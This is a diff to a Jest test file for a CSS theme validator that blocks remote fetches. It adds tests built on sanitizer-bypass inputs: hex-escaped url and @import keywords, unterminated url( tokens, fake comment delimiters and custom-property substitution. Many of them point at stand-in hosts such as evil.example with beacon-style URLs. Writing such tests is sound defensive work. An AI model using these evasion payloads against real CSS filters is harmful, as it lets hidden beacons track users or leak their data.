@@ -60,6 +60,18 @@ describe('validateThemeCss', () => {
     expect(result.isValid).toBe(false);
   });
 
+  it('rejects every @import, including fragment-only forms', () => {
+    expect(validateThemeCss('@import "#theme";').isValid).toBe(false);
+    expect(validateThemeCss('@import url(#theme);').isValid).toBe(false);
+  });
+
+  it('rejects @import text conservatively even when decode makes it look quoted', () => {
+    expect(validateThemeCss('a::before { content: "@import"; }').isValid).toBe(false);
+    expect(
+      validateThemeCss('@layer \\22 ; @import "https://evil.example/x.css";').isValid,
+    ).toBe(false);
+  });
+
   it('rejects relative url(...) (no bundled assets in v1)', () => {
     const result = validateThemeCss('a { background: url("./assets/x.png"); }');
     expect(result.isValid).toBe(false);
@@ -74,9 +86,9 @@ describe('validateThemeCss', () => {
     expect(result.errors[0]).toMatch(/data:/);
   });
 
-  it('ignores commented-out url(...) lines', () => {
+  it('rejects commented-out url(...) text conservatively', () => {
     const result = validateThemeCss('/* a { background: url(http://e.com); } */');
-    expect(result.isValid).toBe(true);
+    expect(result.isValid).toBe(false);
   });
 
   it('rejects CSS exceeding the size cap', () => {
@@ -93,6 +105,35 @@ describe('validateThemeCss', () => {
     expect(result.errors[0]).toMatch(/Line 3/);
   });
 
+  // --- Unterminated url()/src() at end-of-input ---
+
+  it('rejects an unterminated url( at end-of-input (fetches as a url-token)', () => {
+    // The CSS tokenizer emits a fetchable url-token at EOF even without the
+    // closing `)`, so a theme that simply ends mid-url beacons on every load.
+    // The argument regex needs the `)`, so this must be caught separately.
+    for (const css of [
+      'body{background-image:url(http://evil/beacon?ip=leak',
+      'body{background-image:url("http://evil/q',
+      'a{background:url("http://evil/q"',
+      '@font-face{src:src(http://evil/x',
+    ]) {
+      const result = validateThemeCss(css);
+      expect(result.isValid).toBe(false);
+      expect(result.errors.join(' ')).toMatch(/unterminated/i);
+    }
+  });
+
+  it('still accepts a normally-closed url() near end-of-input', () => {
+    expect(validateThemeCss('rect{fill:url(#g)}').isValid).toBe(true);
+    expect(validateThemeCss('a{background:url(#g)}').isValid).toBe(true);
+  });
+
+  it('reports the line of an unterminated url( that is not at the first line', () => {
+    const result = validateThemeCss(':root {}\n\nbody{background:url(http://evil/x');
+    expect(result.isValid).toBe(false);
+    expect(result.errors[0]).toMatch(/Line 3/);
+  });
+
   // --- CSS escape bypass tests (C1) ---
 
   it('rejects \\75rl(...) — `url` with escaped first char', () => {
@@ -103,6 +144,15 @@ describe('validateThemeCss', () => {
   it('rejects u\\72l(...) — `url` with escaped middle char', () => {
     const result = validateThemeCss('a { background: u\\72l(https://e.com/x); }');
     expect(result.isValid).toBe(false);
+  });
+
+  it('rejects url and import keywords split by a CRLF-terminated hex escape', () => {
+    expect(
+      validateThemeCss('a{background:u\\72\r\nl(https://evil.example/x.png)}').isValid,
+    ).toBe(false);
+    expect(validateThemeCss('@\\69\r\nmport "https://evil.example/x.css";').isValid).toBe(
+      false,
+    );
   });
 
   it('rejects \\55RL(...) — uppercase mixed-case escapes', () => {
@@ -125,30 +175,28 @@ describe('validateThemeCss', () => {
     expect(result.isValid).toBe(true);
   });
 
-  // --- Comment-stripper string-literal bypass tests (C2) ---
+  // --- Conservative unstripped security-scan tests ---
 
-  it('does not strip /* and */ tokens that appear inside string literals', () => {
-    // A naive comment stripper would treat `/*` inside the string as the
-    // start of a comment, skip past `*/` (also inside the string), and miss
-    // the malicious `url()` further down.
+  it('rejects a live URL surrounded by comment-like string content', () => {
+    // Security checks inspect the decoded, unstripped source, so apparent
+    // strings cannot swallow a later fetch-bearing function.
     const css = `a::before { content: "/*"; } a { background: url(http://evil) } a::after { content: "*/"; }`;
     const result = validateThemeCss(css);
     expect(result.isValid).toBe(false);
     expect(result.errors[0]).toMatch(/remote/);
   });
 
-  it('handles escaped quote inside a string when stripping comments', () => {
+  it('rejects a live URL after an escaped quote inside a string', () => {
     const css = `a::before { content: "say \\"hi\\""; } a { background: url(http://evil) }`;
     const result = validateThemeCss(css);
     expect(result.isValid).toBe(false);
   });
 
-  // --- Comment-collapse-to-whitespace bypass tests ---
+  // --- Conservative @import scan tests ---
 
   it('rejects @import with a comment between the keyword and the URL', () => {
-    // A naive stripper that deletes comments entirely turns this into
-    // `@import"http://evil/x.css"` which the `@import\s+` regex misses.
-    // Comments must collapse to a single space per CSS spec.
+    // Installed themes reject the at-rule keyword itself, independent of
+    // comment placement or the imported target.
     const result = validateThemeCss('@import/**/"http://evil/x.css";');
     expect(result.isValid).toBe(false);
   });
@@ -160,16 +208,11 @@ describe('validateThemeCss', () => {
 
   // --- url-token comment-bypass tests ---
 
-  it('does not treat /* inside an unquoted url() as a comment opener', () => {
-    // Naive stripper would open a "comment" at `/*` inside the first
-    // url(...) and consume to the next `*/` (or to EOF) — eating the
-    // malicious url(http://evil) entirely. With url-token-aware stripping
-    // both URLs survive into the regex pass and are rejected (the first as
-    // relative, the second as remote).
-    const css = `a{background:url(/*)} b{background:url(http://evil/x)}`;
+  it('rejects comment-like text inside unsupported URLs conservatively', () => {
+    const css = `a{background:url(/*)}`;
     const result = validateThemeCss(css);
     expect(result.isValid).toBe(false);
-    expect(result.errors.some((e) => /remote/.test(e) && /evil/.test(e))).toBe(true);
+    expect(result.errors.join(' ')).toMatch(/unterminated/i);
   });
 
   it('rejects unterminated /* (no closing comment) as malformed CSS', () => {
@@ -180,12 +223,66 @@ describe('validateThemeCss', () => {
     expect(result.errors.join(' ')).toMatch(/unterminated/i);
   });
 
+  it('rejects a raw unterminated comment after an escape-created quote', () => {
+    const result = validateThemeCss(String.raw`\22 /*`);
+    expect(result.isValid).toBe(false);
+    expect(result.errors.join(' ')).toMatch(/unterminated/i);
+  });
+
+  it('rejects raw unterminated comments after literal escaped quotes', () => {
+    for (const css of [String.raw`\" /*`, String.raw`\' /*`]) {
+      const result = validateThemeCss(css);
+      expect(result.isValid).toBe(false);
+      expect(result.errors.join(' ')).toMatch(/unterminated/i);
+    }
+  });
+
+  it('rejects raw unterminated comments after bad-string newlines', () => {
+    for (const css of ['"bad\n/*', "'bad\r/*", 'a{content:"bad\f/*']) {
+      const result = validateThemeCss(css);
+      expect(result.isValid).toBe(false);
+      expect(result.errors.join(' ')).toMatch(/unterminated/i);
+    }
+  });
+
+  it('keeps escaped CRLF line continuations inside raw strings', () => {
+    const result = validateThemeCss('a{content:"bad\\\r\n/*"}');
+    expect(result.isValid).toBe(true);
+  });
+
+  it('keeps escape-created newlines inside decoded strings', () => {
+    const result = validateThemeCss(String.raw`a{content:"\a /*"}`);
+    expect(result.isValid).toBe(true);
+  });
+
+  it('does not let generic function names suppress raw comment validation', () => {
+    for (const css of ['myurl(/*', 'curl(/*', '-url(/*']) {
+      const result = validateThemeCss(css);
+      expect(result.isValid).toBe(false);
+      expect(result.errors.join(' ')).toMatch(/unterminated/i);
+    }
+  });
+
   it('rejects escape-encoded url keyword that hides the url-token', () => {
-    // Decode-before-strip means `u\72l(` is `url(` before the stripper sees
-    // it, so the stripper enters url-mode and doesn't fall for /* inside.
+    // Decode-before-validation makes `u\72l(` a normal url-token before both
+    // malformed-comment validation and the security scan.
     const css = `a{background:u\\72l(/*)} b{background:url(http://evil/x)}`;
     const result = validateThemeCss(css);
     expect(result.isValid).toBe(false);
+  });
+
+  it('rejects live URLs hidden between escape-created fake comment delimiters', () => {
+    const css = String.raw`:root{--x:\2f\2a ;}a{background:url(https://evil.example/x.png)}:root{--y:\2a\2f;}`;
+    expect(validateThemeCss(css).isValid).toBe(false);
+  });
+
+  it('rejects remote URL schemes joined by a string line continuation', () => {
+    for (const newline of ['\n', '\r', '\r\n', '\f']) {
+      const css = `a{background:url("ht\\${newline}tps://evil.example/x")}`;
+      const result = validateThemeCss(css);
+      expect(result.isValid).toBe(false);
+      expect(result.errors.join(' ')).toMatch(/remote/i);
+    }
   });
 
   // --- src() function bypass tests (CSS Fonts L4) ---
@@ -237,7 +334,7 @@ describe('validateThemeCss', () => {
       'a { background: image-set("https://evil.example/track.png" 1x); }',
     );
     expect(result.isValid).toBe(false);
-    expect(result.errors[0]).toMatch(/remote/);
+    expect(result.errors[0]).toMatch(/not supported/);
   });
 
   it('rejects bare image-set(<remote> 1x)', () => {
@@ -254,13 +351,72 @@ describe('validateThemeCss', () => {
     expect(result.isValid).toBe(false);
   });
 
-  it('accepts image-set(linear-gradient(...)) with no URL', () => {
-    // `linear-gradient(...)` is a CSS image function — no fetchable URL
-    // and no inner url()/src(), so the scan should not flag it.
+  it('rejects image-set(var(...)) because substitution can reveal a URL string', () => {
+    const result = validateThemeCss(`
+      :root { --remote-image: "https://evil.example/track.png"; }
+      a { background: image-set(var(--remote-image) 1x); }
+    `);
+    expect(result.isValid).toBe(false);
+  });
+
+  it('rejects image() sources, including custom-property substitution', () => {
+    expect(
+      validateThemeCss('a { background: image("https://evil.example/x.png"); }').isValid,
+    ).toBe(false);
+    expect(
+      validateThemeCss(`
+        :root { --remote-image: "https://evil.example/x.png"; }
+        a { background: image(var(--remote-image)); }
+      `).isValid,
+    ).toBe(false);
+  });
+
+  it('rejects image functions conservatively even when decode makes them look quoted', () => {
+    expect(
+      validateThemeCss('a::before { content: "image(https://example.com)"; }').isValid,
+    ).toBe(false);
+    expect(
+      validateThemeCss(
+        'a{--x:\\22 ;background:image-set("https://evil.example/x.png" 1x)}',
+      ).isValid,
+    ).toBe(false);
+  });
+
+  it('rejects image-set URLs whose escaped quote breaks decoded parsing', () => {
+    const css = String.raw`a{background:image-set("https://evil.example/x\22 .png" 1x)}`;
+    expect(validateThemeCss(css).isValid).toBe(false);
+  });
+
+  it('rejects image-set(linear-gradient(...)) because the function is unsupported', () => {
     const result = validateThemeCss(
       'a { background: image-set(linear-gradient(red, blue) 1x); }',
     );
-    expect(result.isValid).toBe(true);
+    expect(result.isValid).toBe(false);
+  });
+
+  // --- Keyword bans are exempt inside comments (but not strings) ---
+
+  it('allows @import / image() / image-set() keyword text inside comments', () => {
+    // These bans have no fetchable argument to classify, so a genuine comment
+    // mentioning them (e.g. a theme documenting the restriction) is not a rule
+    // and must not eject the theme on install or on re-validation at load.
+    for (const css of [
+      '/* do not use @import in themes */ body{--surface-1:#000}',
+      '/* pick an image (large) then crop */ body{--surface-1:#000}',
+      '/* image-set() is unsupported here */ body{--surface-1:#000}',
+    ]) {
+      expect(validateThemeCss(css).isValid).toBe(true);
+    }
+  });
+
+  it('still rejects real @import / image() / image-set() sitting next to a comment', () => {
+    for (const css of [
+      '/* note */ @import "https://evil.example/x.css";',
+      '/* note */ a{background:image("https://evil.example/x.png")}',
+      '/* note */ a{background:image-set("https://evil.example/x.png" 1x)}',
+    ]) {
+      expect(validateThemeCss(css).isValid).toBe(false);
+    }
   });
 
   // --- THEME_CONTRACT presence-only warning tests ---
@@ -274,9 +430,9 @@ describe('validateThemeCss', () => {
   });
 
   it('does NOT warn when a token is declared anywhere — presence-only semantics', () => {
-    // Declared at :root (mode-inconsistent at runtime, but the v1 validator
-    // is presence-only and does not parse selectors). This test locks in
-    // that behavior so the contract doc and the validator stay in sync.
+    // Declared at :root (ineffective at runtime because the body-scoped base
+    // declarations win, but the v1 validator is presence-only and does not
+    // parse selectors). This locks the documented behavior in place.
     const css = completeContractCss.replace('body {', ':root {');
     const result = validateThemeCss(css);
     expect(result.isValid).toBe(true);
